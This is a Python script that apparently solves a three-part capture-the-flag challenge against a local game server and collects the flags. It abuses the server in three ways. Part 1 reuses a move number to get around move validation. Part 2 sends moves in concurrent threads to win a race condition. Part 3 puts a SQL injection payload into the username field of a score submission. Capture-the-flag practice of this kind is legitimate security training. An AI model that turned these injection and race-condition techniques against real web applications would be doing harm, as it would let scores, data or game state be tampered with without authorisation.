import requests
import time
import threading

url = "http://127.0.0.1:5000"  # Change to your actual server URL
flag1=flag2=flag3 = None
FULL_FLAG=""
#PART 1

while(flag1==None):
    response = requests.get(url + "/new_game_1")
    if response.status_code == 200:
        data = response.json()  # Extract JSON data
        game_id = data.get("game_id")  # Use .get() to avoid errors
        if game_id:
            print("PART 1...GAME ID:", game_id)
            moves = [
            {"game_id": game_id, "row": 0, "col": 0, "moveNo": 1},
            {"game_id": game_id, "row": 1, "col": 0, "moveNo": 1},
            {"game_id": game_id, "row": 2, "col": 0, "moveNo": 1},]
            # Send requests one by one
            for move in moves:
                response = requests.post(url+"/move_1", json=move)
                data=response.json()  # Print server response
                flag1=data.get("flag")
                time.sleep(1)
            if (flag1):
                FULL_FLAG+=flag1
                print("FLAG 1: ",flag1)
    else:
        print("Error: Failed to get response from server. Status Code:", response.status_code)


#PART 2
print()
def send_exploit(move):
    response = requests.post(url+'/move_2', json=move)
    data=response.json()
    global FULL_FLAG
    flag2=data.get("flag")
    if(flag2):
        FULL_FLAG+=flag2
        print("FLAG 2: ",flag2)
response = requests.get(url + "/new_game_2")
if response.status_code == 200:
    data = response.json()  # Extract JSON data
    game_id = data.get("game_id")  # Use .get() to avoid errors
    if game_id:
        print("PART 2...GAME ID:", game_id)
        moves = [
            {"game_id": game_id, "row": 5, "col": 2},
            {"game_id": game_id, "row": 5, "col": 3},
            {"game_id": game_id, "row": 5, "col": 4},
            {"game_id": game_id, "row": 5, "col": 5},
        ]
        # Send requests one by one
        threads = [threading.Thread(target=send_exploit, args=(move,)) for move in moves]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
else:
    print("Error: Failed to get response from server. Status Code:", response.status_code)

#PART3
print()
response = requests.get(url + "/new_game_3")
if response.status_code == 200:
    data = response.json()  # Extract JSON data
    game_id = data.get("game_id")
    if(game_id):
        print("PART 3...GAME ID:", game_id)
        paylaod={"game_id": game_id, "username": "',10);--"}
        response = requests.post(url+"/submit_score_3", json=paylaod)
        data=response.json()  # Print server response
        flag3=data.get("flag")
        if(flag3):
            FULL_FLAG+=flag3
            print("FLAG 3: ",flag3)
else:
    print("Error: Failed to get response from server. Status Code:", response.status_code)

print("\n",FULL_FLAG)